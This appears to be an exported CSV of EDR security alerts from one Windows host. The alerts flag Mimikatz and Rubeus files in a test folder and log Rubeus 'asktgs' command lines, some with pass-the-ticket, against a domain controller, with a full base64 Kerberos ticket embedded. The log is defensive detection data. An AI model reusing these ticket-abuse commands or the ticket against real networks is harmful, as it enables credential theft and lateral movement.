"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T13:36:58.746Z","10.0.6.11","High","70","A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Rubeus.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743168225},@{filename=Local Disk (C).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=File Explorer.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129}",
"2025-03-28T13:36:58.244Z","10.0.6.11","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Local Disk (C) (2).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Rubeus.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743168225},@{filename=Local Disk (C).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=File Explorer.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150}",
"2025-03-28T13:36:58.244Z","10.0.6.11","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Local Disk (C).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Rubeus.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743168225},@{filename=test.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223}",
"2025-03-28T13:36:58.01Z","10.0.6.11","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=test.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Microsoft Edge.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=Rubeus.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743168225},@{filename=Local Disk (C).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129}",
"2025-03-28T13:36:57.731Z","10.0.6.11","High","70","A process has written a kernel driver to disk that CrowdStrike analysts have deemed vulnerable. Attackers can use vulnerable drivers to gain privileged access to a system. Review the process tree and file details.","C:\Windows\Explorer.EXE","@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=Local Disk (C).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Microsoft Edge.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=File Explorer.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150}",
"2025-03-28T13:33:54.755Z","10.0.6.11","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgs /service:ldap/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap /ptt","",
"2025-03-28T13:33:54.752Z","10.0.6.11","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgs /service:ldap/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap /ptt","",
"2025-03-28T13:24:14.769Z","10.0.6.11","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgs /service:cifs/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap","",
"2025-03-28T13:24:13.249Z","10.0.6.11","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgs /service:cifs/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap","",
"2025-03-28T13:23:56.61Z","10.0.6.11","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=This PC.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=File Explorer.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=test.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Microsoft Edge.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129}",
